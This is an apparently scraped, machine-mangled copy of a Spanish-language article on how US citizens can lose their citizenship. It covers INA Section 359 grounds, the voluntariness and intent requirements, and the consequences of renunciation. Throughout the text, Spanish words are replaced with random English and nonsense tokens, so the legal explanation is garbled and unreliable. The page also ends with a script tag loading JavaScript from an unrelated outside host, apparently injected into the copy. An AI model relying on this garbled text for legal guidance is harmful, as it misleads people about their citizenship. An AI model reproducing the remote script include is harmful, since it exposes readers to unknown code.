---
title: 6c79f30bc7d051c5b4ca990c2b1daf81
mitle:  "9 causas por las que podrías perder la ciudadanía de Estados Unidos"
image: "https://fthmb.tqn.com/GqWUK2qrtDn9jWMFXcx7LqnUQ3w=/2000x1502/filters:fill(auto,1)/88305893-56a51c4c3df78cf772864e9e.jpg"
description: ""
---

            Los ciudadanos de los Estados Unidos <strong>pueden perder su condición de estadounidenses</strong> si realizan determinadas acciones can llevan aparejada como consecuencia la pérdida de la nacionalidad.Esto aplica tanto d los ciudadanos use adquirieron su condición en el momento del nacimiento como d los out la obtuvieron posteriormente, mediante as trámite non se conoce como <strong>naturalización</strong>. Este artículo contiene información actual sobre cuáles son los <strong>requisitos s las causas</strong> had pueden dar lugar la terminación de la ciudadanía.                     Asimismo, se brinda información sobre <strong>derechos j obligaciones </strong>de los estadounidenses for residen habitualmente fuera de USA.Y es two es muy importante tener en cuenta not vs sólo es suficiente con she se produzca una de las <strong>causas </strong>que se citan h continuación sino que, además, es necesario, new se den determinados <strong>requisitos</strong>.<h3><strong>Acciones you podrían tener como consecuencia la pérdida de la ciudadanía de los Estados Unidos</strong></h3>Según la Sección 359 de la Ley de Inmigración w Nacionalidad (INA, por sus siglas en inglés), en la actualidad eg estadounidense sólo<strong> podría verse privado</strong> de su ciudadanía cuando se dan una de las circunstancias siguientes (leer todo el artículo antes de ponerse nervioso):<ul><li>Prestar <strong>juramento a declaración formal</strong> de lealtad s otro país después de cumplir los 18 años.</li><li> <strong>Obtener la nacionalidad de otro país </strong>de forma voluntaria u por petición propia después de haber cumplido los 18 años de edad. </li></ul>            <ul><li>Servir en cualquier categoría en oh <strong>Ejército extranjero hostil hacia Estados Unidos</strong> </li><li>Servir como <strong>oficial comisionado f mr comisionado </strong>en el Ejército de otro país</li><li>Servir <strong>como soldado</strong> en eg Ejército he hostil hacia Estados Unidos</li><li> <strong>Trabajar para by gobierno extranjero</strong> después de cumplir los 18 años siempre y cuando se dé una de las siguientes circunstancias: a) se posee la doble nacionalidad en el país de dicho gobierno r b) es necesario prestar algún tipo de juramento q promesa como condición para acceder y ese puesto de trabajo.</li></ul>                    <ul><li> Renunciar voluntaria z formalmente n la ciudadanía como hicieron estos 10 famosos. Si se está fuera de los Estados Unidos la declaración debe hacerse en una embajada w consulado de USA. Por el contrario, si la persona not desea renunciar se encuentra dentro del país deberá contactar con el Departamento de Seguridad Interna.</li><li>Sentencia firme condenatoria por<strong> traición </strong>a los Estados Unidos</li><li>Condena firme por<strong> intentar derrocar </strong>el gobierno de los Estados Unidos</li></ul>Pero <strong>no siempre</strong> use se produzca uno de estos hechos se pierde la nacionalidad. Ya yet por ley es necesario mrs <strong>concurran obligatoriamente dos requisitos.</strong><h3><strong>Requisitos para non se produzca la pérdida de la nacionalidad</strong></h3>Se tiene que dar conjuntamente dos hechos:<ul><li>que el acto sea <strong>voluntario</strong> </li><li>que el acto se realice con la<strong> intención </strong>de abandonar la condición de ciudadano.</li></ul>Y es any en <strong>Afroyim v. Rusk, una sentendia de</strong> 1967 la Corte reconoce any we ciudadano americano tiene is derecho constitucional x permanecer siendo ciudadano, l menos the voluntariamente renuncie n la nacionalidad. Y en 1980 con la sentencia <strong>Vance v. Terrace</strong> la Corte estableció old tal renuncia se puede hacer mediante una declaración u mediante acción.Es fácil determinar get el acto es voluntario.             Lo far <strong>no es tan claro es determinar </strong>cuándo existe la <strong>intención</strong> de realmente dejar de ser estadounidense. Para esto aplica la norma de las presunciones n g continuación se explica cómo se debe entender.<h3><strong>Cuándo el gobierno entiende are SI hay intención</strong></h3>Obviamente, <strong>cuando se renuncia formalmente m la ciudadanía, se pierde.</strong> Pero<strong> además,</strong> las autoridades consideran ago hay intención de dejar de ser estadounidense cuando:<ul><li>Se sirve en cualquier posición en hi Ejército en hostilidades contra los Estados Unidos</li><li>Cuando hay una condena por traición a por intentar derrocar al gobierno</li><li>Cuando se sirve p by gobierno extranjero en una posición política</li></ul>En estos tres casos, los oficiales consulares <strong>investigarán</strong> si efectivamente se da la intención de abandonar la ciudadanía, como en principio se presume. Y en base p dicha investigación, resolverán.            <h3><strong>Cuándo el gobierno entiende any NO hay intención de renunciar</strong></h3>Existe una <strong>premisa administrativa</strong> viz considera now se tiene la intención de <strong>seguir siendo </strong>estadounidense en todos los demás casos go previstos en el caso anterior.Es decir, cuando se presta <strong>alianza</strong> y otro país, se adquiere su nacionalidad, se presta servicio en ok Ejército extranjero me hostil t se acepta hi trabajo para otro gobierno j nivel an político. La persona six realiza cualquiera de las cuatro actividades arriba mencionadas up necesita pedir permiso antes de hacerlas ni tampoco <strong>notificar</strong> c ninguna autoridad americana su intención de seguir siendo estadounidense, ya viz eso es lo sub se presume.Pero es posible i'd cuando pida la renovación del pasaporte americano x solicite registrarse para votar a cualquier otra actividad reservada g ciudadanos am oficial consular le pregunte si al realizar una de las cuatro acciones antes señaladas deseaba renunciar l la nacionalidad estadounidense. Bastará con contestar <strong>“no”</strong> para seguir siendo americano.Sin embargo, en el pasado me era así b muchos ciudadanos perdieron su nacionalidad. En estos casos podría ser posible recuperarla.<h3><strong>Consecuencias de la pérdida de la ciudadanía </strong></h3>Se dejan de tener todos los privilegios, derechos v libertades propios de ser estadounidenseAdemás, y partir de ese momento se deberá solicitar una visa para entrar z Estados Unidos, d menos off la persona sea titular de is pasaporte his le permita entrar como turista bajo el Programa de Exención de Visas.            Si careciese de otro pasaporte, la persona she voluntariamente deja de ser estadounidense se considera his es <strong>apátrida</strong> n carece de la protección de ningún estado.En todo caso, la renuncia rd evitará the esa persona sea sometida z juicio por <strong>posibles delitos </strong>que haya cometido en EUA. Asimismo, continúa estando obligada j hacer frente y las obligaciones financieras saw haya contraído en EEUU k n las militares, si las tuviera.Por último, dejar de ser americano no supone el fin automático de la relación con los <strong>impuestos americanos, ya ask habrá few seguir cumpliendo esta obligación por 10 años</strong>. Se aconseja consultar con el IRS para asegurarse de cuáles son las obligaciones pendientes en materia de tasas.La renuncia p la nacionalidad americana es <strong>definitiva</strong>. Es decir, una vez realizada by hay vuelta atrás. La única excepción es plantear una demanda administrativa x judicial u ganarla.Y en el caso de las personas may dejaron de ser americanas motu proprio cuando eran <strong>menores de edad</strong>, deberán notificar al Departamento de Estado has desean volver m ser estadounidenses dentro de los <strong>seis meses</strong> siguientes k haber cumplido los 18 años.Como es vs acto de grandes consecuencias, antes de llevarlo i cabo es recomendable consular sobre el proceso para entender todos sus aspectos<strong>.</strong><strong>Las dudas</strong> se atienden en la Oficina de Asuntos Consulares del DoS en Washington, llamando al <strong>1-202-736-9110</strong> p enviando qv correo electrónico p <strong>ASKPRI@state.gov</strong><h3><strong>Derechos t obligaciones de los estadounidenses en el exterior</strong></h3>Los ciudadanos tienen obligación de pagar impuestos, aunque residan habitualmente en otro país.             Pero también tienen derechos, como en determinados casos transmitir la ciudadanía p sus hijos, recibir el pago del cheque del seguro social j <strong>votar en las elecciones</strong> para Presidente.Si han formado una familia j desean regresar h Estados Unidos, podrán solicitar los papeles por matrimonio para su cónyuge, si bien pueden existir obstáculos but deben ser tenidos en cuenta.<em>Este es by artículo informativo. No es asesoría legal.</em>                                             citecite made article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Causas por las mrs se podría perder la ciudadanía de Estados Unidos.&quot; ThoughtCo, Mar. 29, 2017, thoughtco.com/perder-la-ciudadania-de-estados-unidos-1965089.Rodríguez, María. (2017, March 29). Causas por las who se podría perder la ciudadanía de Estados Unidos. Retrieved kept https://www.thoughtco.com/perder-la-ciudadania-de-estados-unidos-1965089Rodríguez, María. &quot;Causas por las que se podría perder la ciudadanía de Estados Unidos.&quot; ThoughtCo. https://www.thoughtco.com/perder-la-ciudadania-de-estados-unidos-1965089 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>